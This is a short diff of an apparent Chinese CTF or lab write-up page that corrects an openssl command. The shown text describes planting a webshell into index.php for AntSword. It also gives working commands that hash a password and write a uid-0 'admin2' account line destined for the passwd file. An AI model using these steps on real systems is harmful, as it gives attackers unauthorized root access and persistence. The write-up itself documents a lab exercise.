@@ -254,7 +254,7 @@ color="220,220,220" opacity='0.7' zIndex="-2" count="200" src="//cdn.bootcss.com
 <p>所以这里我在tmp目录下写了一个shell。然后用test把它写入到index.php中，再用蚁剑连接上去</p>
 <p><img src="image-20210618144957050.png" alt="image-20210618144957050"></p>
 <p>(发现多此一举。: p)</p>
-<p>直接写入一个用户到passwd文件里就行<br>    openssl password -1 -salt admin2 admin2</p>
+<p>直接写入一个用户到passwd文件里就行<br>    openssl passwd -1 -salt admin2 admin2</p>
 <pre><code>$1$admin2$Pr1254RlLuWxoieYEI.Sa0
 </code></pre>
 <p>拼接好数据后，写入到/tmp/get文件里，（只有这里可以任意写文件）<br>    echo ‘admin2:$1$admin2$Pr1254RlLuWxoieYEI.Sa0:0:0::/:/bin/bash’ &gt; /tmp/get</p>
